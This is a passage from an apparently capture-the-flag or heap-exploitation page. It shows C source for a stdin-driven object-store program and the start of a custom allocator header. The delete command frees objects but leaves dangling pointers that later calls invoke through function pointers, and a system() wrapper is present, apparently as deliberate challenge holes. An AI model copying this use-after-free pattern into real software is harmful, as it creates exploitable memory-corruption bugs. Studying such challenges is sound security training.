</span></span><span class=line><span class=cl><span class=cp>#define CMD_CREATE  0x10
</span></span></span><span class=line><span class=cl><span class=cp>#define CMD_ADD     0x11
</span></span></span><span class=line><span class=cl><span class=cp>#define CMD_DELETE  0x12
</span></span></span><span class=line><span class=cl><span class=cp>#define CMD_SELL    0x13
</span></span></span><span class=line><span class=cl><span class=cp>#define CMD_DROP    0x14
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=cp>#define MAX_OBJS      1000
</span></span></span><span class=line><span class=cl><span class=cp>#define BUF_SZ        4096
</span></span></span><span class=line><span class=cl><span class=cp>#define MAX_STRING_SZ 1024
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=n>total_earnings</span>  <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=n>total_stocks</span>    <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=n>total_objs</span>      <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>struct</span> <span class=n>object</span><span class=o>*</span> <span class=n>objs</span><span class=p>[</span><span class=n>MAX_OBJS</span><span class=p>];</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>struct</span> <span class=n>object</span><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>int</span>   <span class=n>id</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>int</span>   <span class=n>price</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>char</span><span class=o>*</span> <span class=n>name</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>char</span><span class=o>*</span> <span class=n>description</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>int</span>   <span class=n>stock</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>int</span>   <span class=n>earnings</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>void</span> <span class=p>(</span><span class=o>*</span><span class=n>sell</span><span class=p>)</span> <span class=p>(</span><span class=k>struct</span> <span class=n>object</span><span class=o>*</span> <span class=n>this</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=kt>void</span> <span class=p>(</span><span class=o>*</span><span class=n>add</span><span class=p>)</span> <span class=p>(</span><span class=k>struct</span> <span class=n>object</span><span class=o>*</span> <span class=n>this</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=kt>void</span> <span class=p>(</span><span class=o>*</span><span class=n>drop</span><span class=p>)</span> <span class=p>(</span><span class=k>struct</span> <span class=n>object</span><span class=o>*</span> <span class=n>this</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>function_sell</span><span class=p>(</span><span class=k>struct</span> <span class=n>object</span><span class=o>*</span> <span class=n>this</span><span class=p>){</span>
</span></span><span class=line><span class=cl>  <span class=n>printf</span><span class=p>(</span><span class=s>&#34;CMD_SELL</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span><span class=p>(</span><span class=n>this</span><span class=o>-&gt;</span><span class=n>stock</span> <span class=o>&lt;=</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>this</span><span class=o>-&gt;</span><span class=n>stock</span><span class=o>--</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>this</span><span class=o>-&gt;</span><span class=n>earnings</span> <span class=o>=</span> <span class=n>this</span><span class=o>-&gt;</span><span class=n>earnings</span> <span class=o>+</span> <span class=n>this</span><span class=o>-&gt;</span><span class=n>price</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>function_add</span><span class=p>(</span><span class=k>struct</span> <span class=n>object</span><span class=o>*</span> <span class=n>this</span><span class=p>){</span>
</span></span><span class=line><span class=cl>  <span class=n>printf</span><span class=p>(</span><span class=s>&#34;CMD_ADD</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>this</span><span class=o>-&gt;</span><span class=n>stock</span><span class=o>++</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>execute_system</span><span class=p>(</span><span class=k>const</span> <span class=kt>char</span><span class=o>*</span> <span class=n>cmd</span><span class=p>){</span>
</span></span><span class=line><span class=cl>  <span class=n>system</span><span class=p>(</span><span class=n>cmd</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>notify_end</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>  <span class=k>const</span> <span class=kt>char</span><span class=o>*</span> <span class=n>cmd</span> <span class=o>=</span> <span class=s>&#34;touch /tmp/end&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>execute_system</span><span class=p>(</span><span class=n>cmd</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>function_drop</span><span class=p>(</span><span class=k>struct</span> <span class=n>object</span><span class=o>*</span> <span class=n>this</span><span class=p>){</span>
</span></span><span class=line><span class=cl>  <span class=n>printf</span><span class=p>(</span><span class=s>&#34;CMD_DROP</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>this</span><span class=o>-&gt;</span><span class=n>stock</span><span class=o>--</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>show_object</span><span class=p>(</span><span class=k>struct</span> <span class=n>object</span><span class=o>*</span> <span class=n>obj</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=n>printf</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\t</span><span class=s>id: 0x%x</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>obj</span><span class=o>-&gt;</span><span class=n>id</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>printf</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\t</span><span class=s>Price: %d</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>obj</span><span class=o>-&gt;</span><span class=n>price</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>printf</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\t</span><span class=s>Name: %s</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>obj</span><span class=o>-&gt;</span><span class=n>name</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>printf</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\t</span><span class=s>Description: %s</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>obj</span><span class=o>-&gt;</span><span class=n>description</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>printf</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\t</span><span class=s>Stock: %d</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>obj</span><span class=o>-&gt;</span><span class=n>stock</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>printf</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\t</span><span class=s>Earnings: %d</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>obj</span><span class=o>-&gt;</span><span class=n>earnings</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>struct</span> <span class=n>object</span><span class=o>*</span> <span class=nf>get_object</span><span class=p>(</span><span class=kt>short</span> <span class=kt>int</span> <span class=n>obj_id</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=c1>// Search for the product id
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=kt>int</span> <span class=n>j</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span><span class=p>(</span><span class=n>j</span> <span class=o>&lt;</span> <span class=n>total_objs</span><span class=p>){</span>
</span></span><span class=line><span class=cl>      <span class=k>if</span><span class=p>((</span><span class=kt>short</span> <span class=kt>int</span><span class=p>)</span> <span class=n>objs</span><span class=p>[</span><span class=n>j</span><span class=p>]</span><span class=o>-&gt;</span><span class=n>id</span> <span class=o>==</span> <span class=n>obj_id</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>objs</span><span class=p>[</span><span class=n>j</span><span class=p>];</span>
</span></span><span class=line><span class=cl>      <span class=n>j</span><span class=o>++</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nb>NULL</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>  <span class=kt>char</span> <span class=n>raw_input</span><span class=p>[</span><span class=n>BUF_SZ</span><span class=p>];</span>
</span></span><span class=line><span class=cl>  <span class=kt>int</span> <span class=n>n_read</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>size_t</span> <span class=n>n</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>struct</span> <span class=n>object</span><span class=o>*</span> <span class=n>obj</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>int</span> <span class=n>obj_id</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>memset</span><span class=p>(</span><span class=n>raw_input</span><span class=p>,</span> <span class=mh>0x0</span><span class=p>,</span> <span class=n>BUF_SZ</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=cm>/* Parse file from input */</span>
</span></span><span class=line><span class=cl>  <span class=n>n_read</span> <span class=o>=</span> <span class=n>read</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>raw_input</span><span class=p>,</span> <span class=n>BUF_SZ</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=kt>int</span> <span class=n>idx</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>while</span><span class=p>(</span><span class=n>idx</span> <span class=o>&lt;</span> <span class=n>n_read</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>command</span> <span class=o>=</span> <span class=n>raw_input</span><span class=p>[</span><span class=n>idx</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=n>idx</span><span class=o>++</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>switch</span><span class=p>(</span><span class=n>command</span><span class=p>){</span>
</span></span><span class=line><span class=cl>      <span class=k>case</span> <span class=nl>CMD_CREATE</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>printf</span><span class=p>(</span><span class=s>&#34;CMD_CREATE</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>obj</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>(</span><span class=k>sizeof</span><span class=p>(</span><span class=k>struct</span> <span class=n>object</span><span class=p>));</span>
</span></span><span class=line><span class=cl>        <span class=n>memset</span><span class=p>(</span><span class=n>obj</span><span class=p>,</span> <span class=mh>0x0</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=k>struct</span> <span class=n>object</span><span class=p>));</span>
</span></span><span class=line><span class=cl>        <span class=cm>/* Object ID*/</span>
</span></span><span class=line><span class=cl>        <span class=n>memcpy</span><span class=p>(</span><span class=o>&amp;</span><span class=n>obj</span><span class=o>-&gt;</span><span class=n>id</span><span class=p>,</span> <span class=n>raw_input</span> <span class=o>+</span> <span class=n>idx</span><span class=p>,</span> <span class=mi>2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>idx</span> <span class=o>=</span> <span class=n>idx</span> <span class=o>+</span> <span class=mi>2</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=cm>/* Object Price*/</span>
</span></span><span class=line><span class=cl>        <span class=n>memcpy</span><span class=p>(</span><span class=o>&amp;</span><span class=n>obj</span><span class=o>-&gt;</span><span class=n>price</span><span class=p>,</span> <span class=n>raw_input</span> <span class=o>+</span> <span class=n>idx</span><span class=p>,</span> <span class=mi>2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>idx</span> <span class=o>=</span> <span class=n>idx</span> <span class=o>+</span> <span class=mi>2</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=cm>/* Object name */</span>
</span></span><span class=line><span class=cl>        <span class=n>n</span> <span class=o>=</span> <span class=n>strlen</span><span class=p>((</span><span class=kt>char</span><span class=o>*</span><span class=p>)</span> <span class=n>raw_input</span> <span class=o>+</span> <span class=n>idx</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=n>n</span> <span class=o>==</span> <span class=mi>0</span> <span class=o>||</span> <span class=n>n</span> <span class=o>&gt;</span> <span class=n>MAX_STRING_SZ</span> <span class=o>||</span> <span class=p>(</span><span class=n>idx</span> <span class=o>+</span> <span class=n>n</span><span class=p>)</span> <span class=o>&gt;</span> <span class=n>n_read</span><span class=p>)</span>
</span></span><span class=line><span class=cl>          <span class=k>return</span> <span class=o>-</span><span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>obj</span><span class=o>-&gt;</span><span class=n>name</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>(</span><span class=n>n</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>memcpy</span><span class=p>(</span><span class=n>obj</span><span class=o>-&gt;</span><span class=n>name</span><span class=p>,</span> <span class=n>raw_input</span> <span class=o>+</span> <span class=n>idx</span><span class=p>,</span> <span class=n>n</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>idx</span> <span class=o>=</span> <span class=n>idx</span> <span class=o>+</span> <span class=n>n</span> <span class=o>+</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=cm>/* Object description */</span>
</span></span><span class=line><span class=cl>        <span class=n>n</span> <span class=o>=</span> <span class=n>strlen</span><span class=p>((</span><span class=kt>char</span><span class=o>*</span><span class=p>)</span> <span class=n>raw_input</span> <span class=o>+</span> <span class=n>idx</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=n>n</span> <span class=o>==</span> <span class=mi>0</span> <span class=o>||</span> <span class=n>n</span> <span class=o>&gt;</span> <span class=n>MAX_STRING_SZ</span> <span class=o>||</span> <span class=p>(</span><span class=n>idx</span> <span class=o>+</span> <span class=n>n</span><span class=p>)</span> <span class=o>&gt;</span> <span class=n>n_read</span><span class=p>)</span>
</span></span><span class=line><span class=cl>          <span class=k>return</span> <span class=o>-</span><span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>obj</span><span class=o>-&gt;</span><span class=n>description</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>(</span><span class=n>n</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>memcpy</span><span class=p>(</span><span class=n>obj</span><span class=o>-&gt;</span><span class=n>description</span><span class=p>,</span> <span class=n>raw_input</span> <span class=o>+</span> <span class=n>idx</span><span class=p>,</span> <span class=n>n</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>idx</span> <span class=o>=</span> <span class=n>idx</span> <span class=o>+</span> <span class=n>n</span> <span class=o>+</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>obj</span><span class=o>-&gt;</span><span class=n>sell</span> <span class=o>=</span> <span class=n>function_sell</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>obj</span><span class=o>-&gt;</span><span class=n>add</span>  <span class=o>=</span> <span class=n>function_add</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>obj</span><span class=o>-&gt;</span><span class=n>drop</span> <span class=o>=</span> <span class=n>function_drop</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=n>total_objs</span> <span class=o>&gt;</span> <span class=n>MAX_OBJS</span><span class=p>)</span>
</span></span><span class=line><span class=cl>          <span class=k>return</span> <span class=o>-</span><span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>objs</span><span class=p>[</span><span class=n>total_objs</span><span class=p>]</span> <span class=o>=</span> <span class=n>obj</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>total_objs</span><span class=o>++</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>case</span> <span class=nl>CMD_DROP</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>case</span> <span class=nl>CMD_ADD</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>case</span> <span class=nl>CMD_SELL</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>memcpy</span><span class=p>(</span><span class=o>&amp;</span><span class=n>obj_id</span><span class=p>,</span> <span class=n>raw_input</span> <span class=o>+</span> <span class=n>idx</span><span class=p>,</span> <span class=mi>2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>idx</span> <span class=o>=</span> <span class=n>idx</span> <span class=o>+</span> <span class=mi>2</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>obj</span> <span class=o>=</span> <span class=n>get_object</span><span class=p>(</span><span class=n>obj_id</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=n>obj</span> <span class=o>==</span> <span class=nb>NULL</span><span class=p>)</span>
</span></span><span class=line><span class=cl>          <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=n>command</span> <span class=o>==</span> <span class=n>CMD_ADD</span><span class=p>)</span>
</span></span><span class=line><span class=cl>          <span class=n>obj</span><span class=o>-&gt;</span><span class=n>add</span><span class=p>(</span><span class=n>obj</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span> <span class=k>if</span><span class=p>(</span><span class=n>command</span> <span class=o>==</span> <span class=n>CMD_DROP</span><span class=p>)</span>
</span></span><span class=line><span class=cl>          <span class=n>obj</span><span class=o>-&gt;</span><span class=n>drop</span><span class=p>(</span><span class=n>obj</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span> <span class=k>if</span><span class=p>(</span><span class=n>command</span> <span class=o>==</span> <span class=n>CMD_SELL</span><span class=p>)</span>
</span></span><span class=line><span class=cl>          <span class=n>obj</span><span class=o>-&gt;</span><span class=n>sell</span><span class=p>(</span><span class=n>obj</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>case</span> <span class=nl>CMD_DELETE</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>printf</span><span class=p>(</span><span class=s>&#34;CMD_DELETE</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>memcpy</span><span class=p>(</span><span class=o>&amp;</span><span class=n>obj_id</span><span class=p>,</span> <span class=n>raw_input</span> <span class=o>+</span> <span class=n>idx</span><span class=p>,</span> <span class=mi>2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>idx</span> <span class=o>=</span> <span class=n>idx</span> <span class=o>+</span> <span class=mi>2</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>obj</span> <span class=o>=</span> <span class=n>get_object</span><span class=p>(</span><span class=n>obj_id</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=n>obj</span> <span class=o>==</span> <span class=nb>NULL</span><span class=p>)</span>
</span></span><span class=line><span class=cl>          <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>free</span><span class=p>(</span><span class=n>obj</span><span class=o>-&gt;</span><span class=n>name</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>free</span><span class=p>(</span><span class=n>obj</span><span class=o>-&gt;</span><span class=n>description</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>free</span><span class=p>(</span><span class=n>obj</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=k>default</span><span class=o>:</span>
</span></span><span class=line><span class=cl>        <span class=n>fprintf</span><span class=p>(</span><span class=n>stdout</span><span class=p>,</span> <span class=s>&#34;Command 0x%x not found</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>command</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=o>-</span><span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=n>raw_input</span><span class=p>[</span><span class=n>idx</span><span class=p>]</span> <span class=o>!=</span> <span class=mh>0x0a</span><span class=p>){</span>
</span></span><span class=line><span class=cl>      <span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span> <span class=s>&#34;Missing newline&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=n>exit</span><span class=p>(</span><span class=n>EXIT_FAILURE</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=n>idx</span><span class=o>++</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=n>notify_end</span><span class=p>();</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p><code>hmalloc.h</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span><span class=lnt>76
</span><span class=lnt>77
</span><span class=lnt>78
</span><span class=lnt>79
</span><span class=lnt>80
</span><span class=lnt>81
</span><span class=lnt>82
</span><span class=lnt>83
</span><span class=lnt>84
</span><span class=lnt>85
</span><span class=lnt>86
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=cp>#ifndef HMALLOC_H
</span></span></span><span class=line><span class=cl><span class=cp>#define HMALLOC_H
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdint.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;sys/types.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;sys/mman.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;time.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;unistd.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>//#define DEBUG
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=cp>#ifdef DEBUG
</span></span></span><span class=line><span class=cl><span class=cp>#define DEBUG_PRINT(fmt, args...)    fprintf(stderr, fmt, ## args)
</span></span></span><span class=line><span class=cl><span class=cp>#else
</span></span></span><span class=line><span class=cl><span class=cp>#define DEBUG_PRINT(fmt, args...)
</span></span></span><span class=line><span class=cl><span class=cp>#endif
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=cp>#define PAGE_SZ         4096
</span></span></span><span class=line><span class=cl><span class=cp>#define MAX_ALLOCS      500
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=cm>/* 
</span></span></span><span class=line><span class=cl><span class=cm> * Small buckets: 16, 32, 64, 128, 256, 512, 1024
</span></span></span><span class=line><span class=cl><span class=cm> * Large buckets (not YET supported) : &gt;= 2048
</span></span></span><span class=line><span class=cl><span class=cm> */</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cp>#define SMALL_BUCKET_PAGES    1
</span></span></span><span class=line><span class=cl><span class=cp>#define SMALL_BUCKET_MIN_SZ   16
</span></span></span><span class=line><span class=cl><span class=cp>#define SMALL_BUCKET_MAX_SZ   1024
</span></span></span><span class=line><span class=cl><span class=cp>#define SMALL_BUCKET_MASK     ~0xFFF </span><span class=c1>// 1 PAGE
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=cp>#define LARGE_BUCKET_MIN_SZ   2048
</span></span></span><span class=line><span class=cl><span class=cp>#define LARGE_BUCKET_PAGES    4             
</span></span></span><span class=line><span class=cl><span class=cp></span><span class=c1>//#define LARGE_BUCKET_MASK     0xFFFFFFFFC000 // 4 PAGES
</span></span></span><span class=line><span class=cl><span class=c1>//#define LARGE_BUCKET_MASK     TODO
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=cp>#define FREELIST_REPLACE_BUCKET_THRESHOLD   3
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=cm>/* 10 seconds */</span>
</span></span><span class=line><span class=cl><span class=cp>#define FREELIST_QUARANTINE
</span></span></span><span class=line><span class=cl><span class=cp>#define FREELIST_QUARANTINE_WAIT            10
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cp>#define BUCKET_MAX_SZ   2048
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=k>typedef</span> <span class=kt>uint64_t</span> <span class=kt>bool</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=cp>#define true 1
</span></span></span><span class=line><span class=cl><span class=cp>#define false 0
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=k>struct</span> <span class=n>list_head</span><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=k>struct</span> <span class=n>list_head</span><span class=o>*</span> <span class=n>next</span><span class=p>;</span>
